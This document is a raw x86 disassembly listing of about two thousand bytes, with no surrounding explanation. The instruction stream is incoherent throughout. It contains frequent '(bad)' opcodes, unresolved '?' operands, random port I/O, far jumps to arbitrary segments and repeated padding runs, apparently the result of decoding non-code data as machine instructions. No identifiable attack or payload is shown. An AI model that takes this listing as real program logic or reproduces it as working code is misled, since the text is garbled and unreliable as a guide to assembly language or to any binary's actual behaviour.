  4221eb:	jge    0x42218f
  4221ed:	(bad)  
  4221ee:	dec    esp
  4221ef:	sub    dl,0x46
  4221f2:	sub    al,0x39
  4221f4:	inc    eax
  4221f5:	push   esi
  4221f6:	(bad)  
  4221f7:	mov    ds:0x78beb13e,al
  4221fc:	(bad)  
  4221fd:	mov    ebp,0xba9dbd67
  422202:	fild   WORD PTR [ebp+0x46e35733]
  422208:	shld   eax,edi,cl
  42220b:	fcomp  DWORD PTR [esp+eax*1+0x218fa61a]
  422212:	mov    esi,0x9548053a
  422217:	mov    ds,WORD PTR [ebx-0x2025e5ef]
  42221d:	sub    al,0xfb
  42221f:	test   eax,ebx
  422221:	and    eax,0x85ca533
  422226:	pop    ds
  422227:	sahf   
  422228:	mov    eax,ds:0x53941e9b
  42222d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42222e:	rcr    DWORD PTR [eax-0x27],cl
  422231:	sub    DWORD PTR ds:0xae82b05c,0xee319ab0
  42223b:	cmp    DWORD PTR [eax+0xc],0x3b
  42223f:	outs   dx,DWORD PTR ds:[esi]
  422240:	mul    DWORD PTR [ecx+0x64]
  422243:	xor    al,0xe8
	...
  422251:	add    dl,bl
  422253:	xor    dl,BYTE PTR [edi-0x20500076]
  422259:	jb     0x42225e
  42225b:	inc    ebp
  42225c:	mov    ds:0xcef2fe5c,eax
  422261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422262:	and    eax,ebx
  422264:	add    DWORD PTR [eax],eax
  422266:	pop    ebx
  422267:	add    BYTE PTR [eax],al
  422269:	add    BYTE PTR [edx],bh
  42226b:	es cmp eax,0x5a9bb236
  422271:	dec    edx
  422272:	jp     0x4221fb
  422274:	rol    BYTE PTR [eax-0x2f],0x51
  422278:	fmul   DWORD PTR [ebx]
  42227a:	xchg   edi,eax
  42227b:	ja     0x42228f
  42227d:	popf   
  42227e:	cdq    
  42227f:	pop    esi
  422280:	mov    edx,0x9c5c5ea
  422285:	sub    BYTE PTR [edi],0xad
  422288:	xchg   esp,eax
  422289:	jne    0x4222d7
  42228b:	inc    ecx
  42228c:	jecxz  0x422276
  42228e:	dec    edi
  42228f:	imul   eax,DWORD PTR [esi],0xffffffbf
  422292:	test   eax,ebx
  422294:	cmp    eax,0xcf45eb5a
  422299:	adc    edi,DWORD PTR [eax+0x4c1088f0]
  42229f:	push   edi
  4222a0:	sub    eax,0x70ae7e2f
  4222a5:	inc    ebp
  4222a6:	inc    ebp
  4222a7:	(bad)  
  4222a8:	jmp    0xca63:0xb65e7938
  4222af:	and    al,0x3c
  4222b1:	mov    ebx,0x47df1665
  4222b6:	pop    es
  4222b7:	inc    eax
  4222b8:	das    
  4222b9:	ins    DWORD PTR es:[edi],dx
  4222ba:	test   DWORD PTR [edi+0x615a2590],ebx
  4222c0:	mov    DWORD PTR [eax-0x3f],edi
  4222c3:	jp     0x42227e
	...
  4222d1:	add    BYTE PTR [eax-0x1c],cl
  4222d4:	add    ebx,DWORD PTR [ebx-0x8270051]
  4222da:	pop    esi
  4222db:	sub    BYTE PTR [eax+0x67fcd88f],bl
  4222e1:	pop    edi
  4222e2:	jl     0x4222bc
  4222e4:	add    DWORD PTR [eax],eax
  4222e6:	pop    ebx
  4222e7:	add    BYTE PTR [eax],al
  4222e9:	add    BYTE PTR [ebp+eiz*8+0x54],dh
  4222ed:	lock in eax,dx
  4222ef:	jle    0x422323
  4222f1:	ds pop ebx
  4222f3:	sbb    BYTE PTR [ebx],dh
  4222f5:	fiadd  WORD PTR [ecx+eiz*2]
  4222f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222f9:	push   0x36ec5225
  4222fe:	(bad)  
  422300:	jle    0x4222b9
  422302:	ja     0x4222a6
  422304:	sub    al,0x56
  422306:	mov    dl,0x7f
  422308:	pop    ebp
  422309:	cwde   
  42230a:	(bad)  
  42230b:	adc    ah,BYTE PTR [eax]
  42230d:	sbb    BYTE PTR [eax-0x5a77ffdd],cl
  422313:	out    dx,al
  422314:	jge    0x42229d
  422316:	push   eax
  422317:	out    dx,al
  422318:	out    0x77,al
  42231a:	push   ebp
  42231b:	inc    esi
  42231c:	outs   dx,BYTE PTR ds:[esi]
  42231d:	inc    ebp
  42231e:	or     ecx,DWORD PTR [edx*1-0x56a798a9]
  422325:	popf   
  422326:	mov    cs,WORD PTR ds:0x47b64c86
  42232c:	std    
  42232d:	adc    al,BYTE PTR [ebx+0x6571a677]
  422333:	dec    ebx
  422334:	mov    BYTE PTR [ebx],bh
  422336:	and    eax,0x1b175b51
  42233b:	stc    
  42233c:	pushf  
  42233d:	dec    esi
  42233e:	cmp    BYTE PTR [ebx-0x64969985],bl
  422344:	nop
	...
  422351:	add    BYTE PTR [edx+0x4],dl
  422354:	mov    ds:0x72a6f682,al
  422359:	aam    0x6d
  42235b:	xor    dh,BYTE PTR [edx]
  42235d:	and    eax,0x5621fbd2
  422362:	xlat   BYTE PTR ds:[ebx]
  422363:	fadd   DWORD PTR [ecx]
  422365:	add    BYTE PTR [ebx+0x0],bl
  422368:	add    BYTE PTR [eax],al
  42236a:	cli    
  42236b:	ret    
  42236c:	dec    DWORD PTR [ecx+eiz*1+0x5d55a5da]
  422373:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422374:	and    cl,BYTE PTR [eax+0x74]
  422377:	sbb    BYTE PTR [ecx+edx*1+0x6ebc568f],al
  42237e:	fild   QWORD PTR [ebp-0x48]
  422381:	jnp    0x42236d
  422383:	add    ebp,eax
  422385:	sub    al,0xdc
  422387:	sub    al,0x9b
  422389:	retf   0x645a
  42238c:	jbe    0x422324
  42238e:	jns    0x422398
  422390:	cmc    
  422391:	int    0xdb
  422393:	into   
  422394:	inc    edi
  422395:	out    0x68,eax
  422397:	xchg   ebp,eax
  422398:	pusha  
  422399:	popa   
  42239a:	pop    ebx
  42239b:	mov    ds:0x725b3033,al
  4223a0:	mov    eax,0x9c287906
  4223a5:	mov    BYTE PTR [eax],0xe0
  4223a8:	add    eax,0xb26a5c4
  4223ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223ae:	dec    edi
  4223af:	jne    0x4223e6
  4223b1:	cmp    bh,BYTE PTR ds:[edx]
  4223b4:	dec    ebx
  4223b5:	cdq    
  4223b6:	fistp  WORD PTR [eax-0x46c40b07]
  4223bc:	mov    ch,0x7e
  4223be:	jbe    0x4223d5
  4223c0:	mov    dl,0x9
  4223c2:	mov    ebp,0x1a44
	...
  4223cf:	add    BYTE PTR [eax],al
  4223d1:	add    BYTE PTR [eax],bh
  4223d3:	push   0xffffff96
  4223d5:	add    edx,esi
  4223d7:	(bad)  
  4223d8:	mov    ebp,0xdb4ef67b
  4223dd:	out    0x3f,eax
  4223df:	(bad)  
  4223e0:	adc    cl,BYTE PTR [ecx+0x32]
  4223e3:	fld    DWORD PTR [ecx]
  4223e5:	add    BYTE PTR [ebx+0x0],bl
  4223e8:	add    BYTE PTR [eax],al
  4223ea:	push   ds
  4223eb:	dec    esp
  4223ec:	ins    BYTE PTR es:[edi],dx
  4223ed:	mov    ds:0xe495a0fc,al
  4223f2:	test   esp,esi
  4223f4:	fwait
  4223f5:	stc    
  4223f6:	popa   
  4223f7:	fs pop ecx
  4223f9:	nop
  4223fa:	xor    BYTE PTR [ebx-0x17],0xa2
  4223fe:	dec    edx
  4223ff:	test   ebx,eax
  422401:	pop    ebx
  422402:	fcom   QWORD PTR [ebx+ebx*1]
  422405:	mov    ebx,0xd871814e
  42240a:	xchg   edi,eax
  42240b:	jge    0x4223e4
  42240d:	and    eax,0xb8ea21a2
  422412:	push   es
  422413:	es repnz xchg edi,eax
  422416:	pop    ebp
  422417:	mov    WORD PTR [eax+0x3b17804b],?
  42241d:	mov    DWORD PTR [eax],ecx
  42241f:	popa   
  422420:	sbb    bh,bh
  422422:	outs   dx,BYTE PTR ds:[esi]
  422423:	out    dx,al
  422424:	hlt    
  422425:	mov    cl,0xa6
  422427:	inc    ebx
  422428:	pop    edi
  422429:	imul   ebx,DWORD PTR [ebx-0x4d],0xffffffa8
  42242d:	jmp    0x4223b0
  42242f:	loopne 0x422447
  422431:	out    dx,al
  422432:	hlt    
  422433:	dec    ebx
  422434:	push   esp
  422435:	pop    ebp
  422436:	dec    esi
  422437:	cld    
  422438:	(bad)  
  422439:	push   eax
  42243a:	sbb    BYTE PTR [edx+0x402db800],dl
  422440:	cmc    
  422441:	lock rol DWORD PTR [edx],0x44
	...
  422451:	add    cl,ch
  422453:	mov    ecx,0xf37a307a
  422458:	jmp    0x422453
  42245a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42245e:	or     al,0x52
  422460:	mov    ebx,0x1d98d23
  422465:	add    BYTE PTR [ebx+0x0],bl
  422468:	add    BYTE PTR [eax],al
  42246a:	ror    edi,1
  42246c:	add    edi,DWORD PTR [edx]
  42246e:	js     0x42246c
  422470:	or     al,0x7e
  422472:	jnp    0x42245e
  422474:	jecxz  0x42247b
  422476:	mov    esp,0xf3963a6
  42247b:	sbb    eax,0xabd08651
  422480:	loope  0x42245e
  422482:	xchg   esi,eax
  422483:	les    edi,FWORD PTR [ecx+0x5d64fa33]
  422489:	push   0x6d63116
  42248e:	shr    BYTE PTR [edx-0x77ae19d0],0xd4
  422495:	sti    
  422496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422497:	outs   dx,DWORD PTR ds:[esi]
  422498:	jb     0x4224e2
  42249a:	inc    ebx
  42249b:	mov    eax,ds:0x83d0face
  4224a0:	dec    edx
  4224a1:	pop    edx
  4224a2:	sub    ebp,DWORD PTR [ecx]
  4224a4:	cmp    BYTE PTR [ecx-0x3],bh
  4224a7:	in     al,dx
  4224a8:	cmp    ecx,DWORD PTR [edx]
  4224aa:	mov    dh,dh
  4224ac:	xlat   BYTE PTR ds:[ebx]
  4224ad:	stos   BYTE PTR es:[edi],al
  4224ae:	sbb    esi,ebp
  4224b0:	mov    dh,0xe4
  4224b2:	scas   al,BYTE PTR es:[edi]
  4224b3:	js     0x4224b7
  4224b5:	xor    edi,esi
  4224b7:	retf   0xfc9
  4224ba:	retf   0xf049
  4224bd:	add    ah,BYTE PTR [esi+0x411099ac]
  4224c3:	or     ebx,DWORD PTR [edx]
	...
  4224d1:	add    BYTE PTR [ebx+0x41],bl
  4224d4:	pop    ebx
  4224d5:	iret   
  4224d6:	pop    ebx
  4224d7:	(bad)  
  4224d9:	aad    0xf
  4224db:	ss dec esp
  4224dd:	dec    esi
  4224de:	in     al,0x51
  4224e0:	pop    esp
  4224e1:	sub    ebp,eax
  4224e3:	fld    DWORD PTR [ecx]
  4224e5:	add    BYTE PTR [ebx+0x0],bl
  4224e8:	add    BYTE PTR [eax],al
  4224ea:	mov    ebp,0xa2e9ecf6
  4224ef:	sub    BYTE PTR ds:0xc19fea67,ch
  4224f5:	sub    eax,0x62bc36bb
  4224fa:	mov    WORD PTR [esi-0x16],?
  4224fd:	sbb    al,dh
  4224ff:	(bad)  
  422500:	into   
  422501:	mov    eax,0x32eaea64
  422506:	aas    
  422507:	inc    edx
  422508:	test   BYTE PTR [ebx+0x4fdfec02],al
  42250e:	loopne 0x422509
  422510:	and    eax,0x2593c8af
  422515:	adc    DWORD PTR [edx],edi
  422517:	xor    DWORD PTR [eax+edi*2+0xf79eb1f],edi
  42251e:	mov    esi,DWORD PTR [ebx]
  422520:	mov    dh,0x19
  422522:	stc    
  422523:	dec    ebx
  422524:	popa   
  422525:	push   0x246ac5f0
  42252a:	pusha  
  42252b:	imul   ecx,DWORD PTR [edx+0x2e],0x83d043b4
  422532:	jns    0x42253f
  422534:	mov    dh,0xe0
  422536:	and    bl,0x37
  422539:	xchg   DWORD PTR [eax-0x2ad5ca9d],eax
  42253f:	(bad)  
  422540:	(bad)  
  422541:	pop    edi
  422542:	adc    eax,0x6423
	...
  42254f:	add    BYTE PTR [eax],al
  422551:	add    BYTE PTR [ebx+0x7f3c6585],bl
  422557:	cld    
  422558:	(bad)  [edi-0x65be08a1]
  42255e:	push   edx
  42255f:	xchg   ebp,eax
  422560:	fisub  DWORD PTR [esi+0x1da43]
  422566:	pop    ebx
  422567:	add    BYTE PTR [eax],al
  422569:	add    al,dl
  42256b:	pop    ss
  42256c:	aam    0x6a
  42256e:	mov    ebx,0x6c0155d2
  422573:	outs   dx,DWORD PTR ds:[esi]
  422574:	cmp    bh,BYTE PTR [eax+eax*4-0x974e1e8]
  42257b:	das    
  42257c:	push   esi
  42257d:	shl    ecx,1
  42257f:	shl    BYTE PTR [edx+ebx*1],0x52
  422583:	das    
  422584:	ds mov bl,0x7d
  422587:	cld    
  422588:	inc    ebx
  422589:	jp     0x42253b
  42258b:	sub    esi,ebx
  42258d:	mov    al,ds:0x9d8c69f6
  422592:	dec    esi
  422593:	dec    dx
  422595:	sbb    bl,cl
  422597:	pop    esp
  422598:	scas   eax,DWORD PTR es:[edi]
  422599:	rcr    ebx,0x3f
  42259c:	mov    dh,0xec
  42259e:	cdq    
  42259f:	inc    esp
  4225a0:	or     al,0xb6
  4225a2:	cmp    bl,BYTE PTR [ecx-0x32]
  4225a5:	mov    BYTE PTR [eax+0x12],dh
  4225a8:	jmp    0xeafc:0x7390f28c
  4225af:	hlt    
  4225b0:	xchg   BYTE PTR [esi*1+0x26cfd093],ah
  4225b7:	and    esp,0x58
  4225ba:	test   al,0xe7
  4225bc:	xchg   edx,eax
  4225bd:	cmp    ecx,DWORD PTR [ecx-0x4abb6ea0]
  4225c3:	lea    edx,[eax+eax*1+0x0]
	...
  4225d2:	outs   dx,BYTE PTR ds:[esi]
  4225d3:	jae    0x4225c5
  4225d5:	retf   0xcbfd
  4225d8:	jle    0x4225d1
  4225da:	repz xor eax,0xf6708ce9
  4225e0:	ror    ebp,cl
  4225e2:	sahf   
  4225e3:	fiadd  DWORD PTR [ecx]
  4225e5:	add    BYTE PTR [ebx+0x0],bl
  4225e8:	add    BYTE PTR [eax],al
  4225ea:	push   edi
  4225eb:	mov    cl,0x21
  4225ed:	in     eax,0xed
  4225ef:	outs   dx,DWORD PTR ds:[esi]
  4225f0:	jno    0x42259a
  4225f2:	lods   eax,DWORD PTR ds:[esi]
  4225f3:	xor    ch,BYTE PTR [esi+0x76]
  4225f6:	jns    0x422662
  4225f8:	arpl   WORD PTR ds:0x4a1018cc,sp
  4225fe:	sahf   
  4225ff:	jae    0x422635
  422601:	pop    ebp
  422602:	pop    ss
  422603:	jno    0x422629
  422605:	retf   0xde54
  422608:	push   0x1f
  42260a:	mov    cl,0x35
  42260c:	pop    ebx
  42260d:	scas   eax,DWORD PTR es:[edi]
  42260e:	dec    esi
  42260f:	jecxz  0x422622
  422611:	jbe    0x42266a
  422613:	push   ds
  422614:	mov    ds:0xf5abd5cb,eax
  422619:	icebp  
  42261a:	test   BYTE PTR [ebx-0x793f6733],al
  422620:	ret    0x7bd7
  422623:	sub    BYTE PTR [edx],ah
  422625:	jae    0x42268c
  422627:	shl    DWORD PTR [edi],cl
  422629:	inc    eax
  42262a:	or     eax,0xdf4933b9
  42262f:	jg     0x422608
  422631:	es jmp 0x422612
  422634:	hlt    
  422635:	and    BYTE PTR [edx*8-0x31542d1e],dl
  42263c:	xor    al,dl
  42263e:	test   cl,cl
  422640:	inc    edx
  422641:	pop    ebx
  422642:	pusha  
  422643:	pop    es
  422644:	push   ss
	...
  422651:	add    ch,dh
  422653:	adc    al,0xae
  422655:	adc    ebp,edi
  422657:	mov    ebx,0x84e6f6fd
  42265c:	lds    ebp,FWORD PTR [edx-0x5c690b89]
  422662:	stc    
  422663:	fiadd  DWORD PTR [ecx]
  422665:	add    BYTE PTR [ebx+0x0],bl
  422668:	add    BYTE PTR [eax],al
  42266a:	(bad)  
  42266b:	int    0x8
  42266d:	mov    eax,0xc32fdc78
  422672:	dec    ebx
  422673:	xor    ch,BYTE PTR [eax+0x58b8a550]
  422679:	fcomp  st(5)
  42267b:	fnstenv [esi+0x26]
  42267e:	dec    eax
  42267f:	inc    eax
  422680:	hlt    
  422681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422682:	rol    BYTE PTR [edx-0x3c97260f],cl
  422688:	cmp    al,0xb4
  42268a:	xchg   edi,eax
  42268b:	mov    eax,ds:0x73d30a2b
  422690:	fidiv  WORD PTR [ebp-0x52]
  422693:	inc    edi
  422694:	lock mov ebx,ss
  422697:	fcomp  QWORD PTR fs:[edi]
  42269a:	call   0x25d5:0x8ed725de
  4226a1:	cmp    ebp,ecx
  4226a3:	push   0xdc36094a
  4226a8:	xor    ebp,DWORD PTR [edi+0x12]
  4226ab:	imul   esp,DWORD PTR [eax+edx*4+0x55706a43],0x91f9d6a
  4226b6:	xchg   esp,eax
  4226b7:	mov    dh,0xd4
  4226b9:	xor    al,0x4e
  4226bb:	add    esp,DWORD PTR [edi+0x4a36146d]
  4226c1:	imul   ebx,DWORD PTR [edi+0xcbf3],0x0
  4226cb:	add    BYTE PTR [eax],al
  4226cd:	add    BYTE PTR [eax],al
  4226cf:	add    BYTE PTR [eax],al
  4226d1:	add    BYTE PTR [ebx],bh
  4226d3:	mov    cl,0x57
  4226d5:	lock fcomip st,st(6)
  4226d8:	mov    edi,0xbb1c16fb
  4226dd:	sar    BYTE PTR [ecx+esi*2-0x24abb183],0x1
  4226e5:	add    BYTE PTR [ebx+0x0],bl
  4226e8:	add    BYTE PTR [eax],al
  4226ea:	mov    edi,0x98230b7
  4226ef:	fdivr  st(4),st
  4226f1:	stos   BYTE PTR es:[edi],al
  4226f2:	mov    esp,0x25d148dc
  4226f7:	xchg   ecx,eax
  4226f8:	pop    edx
  4226f9:	mov    ds:0x2564ec88,eax
  4226fe:	inc    eax
  4226ff:	jae    0x422695
  422701:	mov    esp,ds
  422703:	cwde   
  422704:	adc    eax,0x2dfb316c
  422709:	push   0x1a
  42270b:	pop    esp
  42270c:	inc    eax
  42270d:	retf   0xca38
  422710:	pop    ecx
  422711:	pushf  
  422712:	imul   esp,eax,0xffffffed
  422715:	jne    0x422729
  422717:	push   edx
  422718:	aad    0x9
  42271a:	or     al,BYTE PTR [eax]
  42271c:	out    dx,al
  42271d:	push   ebp
  42271e:	add    eax,0xb302ce30
  422723:	dec    ecx
  422724:	pop    esi
  422725:	in     al,dx
  422726:	pop    ecx
  422727:	pusha  
  422728:	mov    edi,0xfcdcf9a5
  42272d:	in     al,0x74
  42272f:	push   es
  422730:	outs   dx,DWORD PTR ds:[esi]
  422731:	scas   eax,DWORD PTR es:[edi]
  422732:	jl     0x42273c
  422734:	xor    eax,0x8defd16f
  422739:	add    DWORD PTR [esi],0x9cb240f5
  42273f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422740:	dec    ebx
  422742:	js     0x42274e
  422744:	add    BYTE PTR fs:[eax],al
	...
  42274f:	add    BYTE PTR [eax],al
  422751:	add    ah,dl
  422753:	sqrtps xmm6,xmm0
  422756:	(bad)  
  422758:	cmc    
  422759:	das    
  42275a:	sbb    BYTE PTR [eax],cl
  42275c:	xchg   ebx,eax
  42275d:	iret   
  42275e:	addr16 push es
  422760:	jo     0x42277b
  422762:	scas   eax,DWORD PTR es:[edi]
  422763:	fild   DWORD PTR [ecx]
  422765:	add    BYTE PTR [ebx+0x0],bl
  422768:	add    BYTE PTR [eax],al
  42276a:	and    al,BYTE PTR [edx]
  42276c:	mov    ecx,0x54f41183
  422771:	xor    BYTE PTR [ecx],0x45
  422774:	(bad)  
  422775:	arpl   WORD PTR [ebp+edi*1+0x8d97ad2],sp
  42277c:	dec    esi
  42277d:	fcom   DWORD PTR [edx]
  42277f:	dec    ebx
  422780:	xor    ah,cl
  422782:	stc    
  422783:	shl    BYTE PTR [eax],cl
  422785:	sti    
  422786:	fld    QWORD PTR [esi+eiz*2]
  422789:	and    ebp,ecx
  42278b:	inc    ebx
  42278c:	mov    al,0xe2
  42278e:	pop    esp
  42278f:	xchg   esi,eax
  422790:	push   edx
  422791:	cli    
  422792:	xor    eax,0x8745b2f3
  422797:	aam    0xb1
  422799:	rol    DWORD PTR [ebp+0x6c],0xa
  42279d:	stos   DWORD PTR es:[edi],eax
  42279e:	mov    al,0xfa
  4227a0:	sub    eax,DWORD PTR ds:[esi+ebx*8+0x5bbc8eb3]
  4227a8:	jge    0x422813
  4227aa:	cmp    esi,DWORD PTR [ebx+0x10]
  4227ad:	xchg   ebx,eax
  4227ae:	mov    edx,0xca1be226
  4227b3:	repz xchg edi,eax
  4227b5:	sbb    DWORD PTR [ecx],0xb57fddb8
  4227bb:	push   cs
  4227bc:	xchg   esp,eax
  4227bd:	cmp    BYTE PTR [ecx-0x49d96fc1],bl
  4227c3:	aad    0xc9
	...
  4227d1:	add    ch,cl
  4227d3:	sub    eax,0xfbf54395
  4227d8:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4227de:	or     esp,DWORD PTR [edx]
  4227e0:	cmp    al,0x13
  4227e2:	or     bl,ah
  4227e4:	add    DWORD PTR [eax],eax
  4227e6:	pop    ebx
  4227e7:	add    BYTE PTR [eax],al
  4227e9:	add    BYTE PTR [esi-0x67],ch
  4227ec:	pushf  
  4227ed:	std    
  4227ee:	lds    ebp,FWORD PTR [esp+ebx*2]
  4227f1:	pop    esp
  4227f2:	rol    BYTE PTR [eax],cl
  4227f4:	cmp    DWORD PTR [edi],esi
  4227f6:	pop    eax
  4227f7:	xlat   BYTE PTR ds:[ebx]
  4227f8:	push   edx
  4227f9:	outs   dx,DWORD PTR ss:[esi]
  4227fb:	js     0x4227eb
  4227fd:	jno    0x42285c
  4227ff:	icebp  
  422800:	mov    al,ds:0xf74e8bc8
  422805:	retf   
  422806:	call   0xe8d4ee11
  42280b:	xor    BYTE PTR [ecx],ah
  42280d:	sar    BYTE PTR [edi+eax*1-0x58960167],0x46
  422815:	pushf  
  422816:	(bad)  
  422818:	pop    esi
  422819:	test   dh,ah
  42281b:	and    bl,bl
  42281d:	sbb    eax,0xa546cd5c
  422822:	add    al,0x7
  422824:	inc    esp
  422825:	push   esi
  422826:	sub    eax,0x86a22c13
  42282b:	xchg   edx,eax
  42282c:	add    al,0xfa
  42282e:	sub    edx,DWORD PTR [ebp+eiz*8-0x28f9e1d7]
  422835:	push   ss
  422836:	or     ch,dh
  422838:	push   esp
  422839:	mov    ds:0xa7dd9b4a,eax
  42283e:	cwde   
  42283f:	adc    ch,bh
  422841:	inc    ebp
  422842:	jmp    0x424863
	...
  42284f:	add    BYTE PTR [eax],al
  422851:	add    BYTE PTR [ebx],dl
  422853:	fs out 0xb,eax
  422856:	test   DWORD PTR [ebx-0xce58301],0xcee94cfc
  422860:	xchg   esi,eax
  422861:	shl    BYTE PTR [ebp-0x24],1
  422864:	add    DWORD PTR [eax],eax
  422866:	pop    ebx
  422867:	add    BYTE PTR [eax],al
  422869:	add    BYTE PTR [edi+0x1ef11ade],ch
  42286f:	lods   eax,DWORD PTR ds:[esi]
  422870:	test   eax,0x5bef17c
  422875:	xchg   edi,eax
  422876:	aad    0x27
  422878:	test   al,0x28
  42287a:	adc    esp,DWORD PTR [esi+edx*2-0x77]
  42287e:	div    BYTE PTR [eax-0x51]
  422881:	pop    eax
  422882:	lds    esi,FWORD PTR [edx]
  422884:	arpl   ax,di
  422886:	hlt    
  422887:	test   al,0xa5
  422889:	jmp    0x4228f6
  42288b:	push   0xffffffd5
  42288d:	or     eax,0x7ca5d44a
  422892:	xchg   esp,eax
  422893:	xor    ch,ch
  422895:	dec    edi
  422896:	or     DWORD PTR [ebx],edi
  422898:	inc    esi
  422899:	or     ch,bl
  42289b:	jbe    0x42291b
  42289d:	test   al,0xe6
  42289f:	adc    edi,DWORD PTR [eax+0x19]
  4228a2:	aas    
  4228a3:	pusha  
  4228a4:	hlt    
  4228a5:	les    edi,FWORD PTR [esi]
  4228a7:	cdq    
  4228a8:	aas    
  4228a9:	jl     0x422917
  4228ab:	pop    ds
  4228ac:	retf   0xea60
  4228af:	mov    esi,?
  4228b1:	xor    BYTE PTR [ebx-0x62],0xef
  4228b5:	ja     0x4228de
  4228b7:	daa    
  4228b8:	jg     0x422930
  4228ba:	cli    
  4228bb:	data16 and bh,bh
  4228be:	inc    DWORD PTR ds:0xdbae35b1
  4228c4:	add    BYTE PTR fs:[eax],al
	...
  4228cf:	add    BYTE PTR [eax],al
  4228d1:	add    BYTE PTR [esi],dh
  4228d3:	add    dl,BYTE PTR [ebp+0xc]
  4228d6:	jne    0x422937
  4228d8:	jg     0x422914
  4228da:	clc    
  4228db:	cs aas 
  4228dd:	push   0x847bcd67
  4228e2:	hlt    
  4228e3:	iret   
  4228e4:	add    DWORD PTR [eax],eax
  4228e6:	pop    ebx
  4228e7:	add    BYTE PTR [eax],al
  4228e9:	add    BYTE PTR [ecx],cl
  4228eb:	jle    0x422885
  4228ed:	mov    eax,ds:0xd9e6adf9
  4228f2:	pop    ecx
  4228f3:	(bad)  
  4228f4:	in     eax,dx
  4228f5:	or     DWORD PTR [edx],0x7b37c2a9
  4228fb:	mov    bh,0x88
  4228fd:	fdivr  st,st(1)
  4228ff:	imul   ebp,DWORD PTR [esi-0x1a024bc2],0xa34473a7
  422909:	js     0x4228e2
  42290b:	inc    ecx
  42290c:	sbb    esp,eax
  42290e:	xchg   ebp,eax
  42290f:	int3   
  422910:	sub    BYTE PTR [edx],al
  422912:	rcr    al,0x94
  422915:	repz repz ja 0x422990
  422919:	mov    cl,0xbb
  42291b:	cs neg edi
  42291e:	stc    
  42291f:	xor    esp,DWORD PTR [ebx+0x76d012a7]
  422925:	push   esi
  422926:	jns    0x42294c
  422928:	fwait
  422929:	loopne 0x4228cf
  42292b:	xchg   esp,eax
  42292c:	or     eax,0x78eee227
  422931:	cmp    ebp,ebx
  422933:	or     BYTE PTR [ebx],0x23
  422936:	test   BYTE PTR [edx+0x6f],cl
  422939:	push   edi
  42293a:	mov    WORD PTR [ebx-0xe499566],es
  422940:	add    ecx,ebp
  422942:	das    
  422943:	aaa    
  422944:	mov    ds:0x0,al
	...
  422951:	add    BYTE PTR [eax],cl
  422953:	mov    cl,0x72
  422955:	cmp    edi,ebx
  422957:	sti    
  422958:	dec    ecx
  422959:	mov    bl,0x94
  42295b:	je     0x422934
  42295d:	call   0xd04f:0xec1e6f11
  422964:	add    DWORD PTR [eax],eax
  422966:	pop    ebx
  422967:	add    BYTE PTR [eax],al
  422969:	add    ah,cl
  42296b:	mov    ebp,DWORD PTR ds:0xe48b707e
  422971:	pop    edi
  422972:	dec    edi
  422973:	xor    BYTE PTR ds:0x4ec33d70,dh
  422979:	mov    esp,0x5cba26bb
  42297e:	push   edx
  42297f:	inc    ebp
  422980:	ins    BYTE PTR es:[edi],dx
  422981:	imul   ebp,DWORD PTR [esi],0xffffffb5
  422984:	into   
  422985:	dec    edx
  422986:	push   esi
  422987:	sub    BYTE PTR [ebx],dl
  422989:	in     al,dx
  42298a:	icebp  
  42298b:	mov    ebx,0x4d1e231b
  422990:	pop    ecx
  422991:	and    ecx,0xffffffc5
  422994:	jl     0x422977
  422996:	outs   dx,BYTE PTR ds:[esi]
  422997:	(bad)  
  422998:	sub    al,0x2d
  42299a:	lahf   
  42299b:	mov    cl,0x3f
  42299d:	test   BYTE PTR [edi],ah
  42299f:	jno    0x422968
  4229a1:	jmp    0xebe3:0x1e5ccb47
  4229a8:	fcom   st(2)
  4229aa:	push   esi
  4229ab:	xor    ebp,DWORD PTR [eax-0x24]
  4229ae:	mov    WORD PTR [esi],fs
  4229b0:	neg    DWORD PTR [ebx+edx*1]
  4229b3:	cmp    DWORD PTR [ebp-0x41],eax
  4229b6:	jae    0x422940
  4229b8:	xor    ebx,eax
  4229ba:	scas   eax,DWORD PTR es:[edi]
  4229bb:	iret   
  4229bc:	mov    esi,0xffb22caa
  4229c1:	xor    al,0x7a
  4229c3:	push   ebp
  4229c4:	mov    ch,0x0
	...
  4229d2:	fist   WORD PTR [ebx-0x4e]
  4229d5:	dec    edi
  4229d6:	mov    esi,0x67d3ffef
  4229db:	xchg   ecx,edi
  4229dd:	adc    al,0x1d
  4229df:	loopne 0x422a40
  4229e1:	retf   0xd0aa
  4229e4:	add    DWORD PTR [eax],eax
  4229e6:	pop    ebx
  4229e7:	add    BYTE PTR [eax],al
  4229e9:	add    BYTE PTR [esi-0xb],dl
  4229ec:	sub    al,0xa5
  4229ee:	int    0x11
  4229f0:	and    edi,DWORD PTR [eax-0x5f]
  4229f3:	pop    ds
  4229f4:	(bad)  
  4229f5:	mov    ebp,0x1efb58d8
  4229fa:	data16 repz aad 0xc3
  4229fe:	in     eax,dx
  4229ff:	rcl    BYTE PTR [eax+0x6659dea4],0xb
  422a06:	xlat   BYTE PTR ds:[ebx]
  422a07:	retf   
  422a08:	mov    ds:0xf5f05648,eax
  422a0d:	pop    si
  422a0f:	pop    edi
  422a10:	imul   edi,DWORD PTR [edx-0x17],0xffffffac
  422a14:	mov    ecx,0x20494d4e
  422a19:	xchg   ebp,eax
  422a1a:	addr16 int3 
  422a1c:	ficomp DWORD PTR [ebx+ebx*1+0x1bba76d8]
  422a23:	ins    DWORD PTR es:[edi],dx
  422a24:	inc    ebx
  422a25:	test   eax,0xeb2d9612
  422a2a:	bound  ebx,QWORD PTR [edx]
  422a2c:	xchg   ecx,eax
  422a2d:	inc    ebp
  422a2e:	popf   
  422a2f:	std    
  422a30:	ffree  st(5)
  422a32:	sub    DWORD PTR [eax-0x70b1f6ce],esi
  422a38:	push   0xffffffb6
  422a3a:	mov    BYTE PTR [ecx+0x13e3da51],0x1a
  422a41:	pop    ebp
  422a42:	xor    al,0xa3
  422a44:	cli    
	...
  422a51:	add    BYTE PTR [edi-0x24252cf4],al
  422a57:	fisttp WORD PTR [edi+0x640ccb5d]
  422a5d:	push   ss
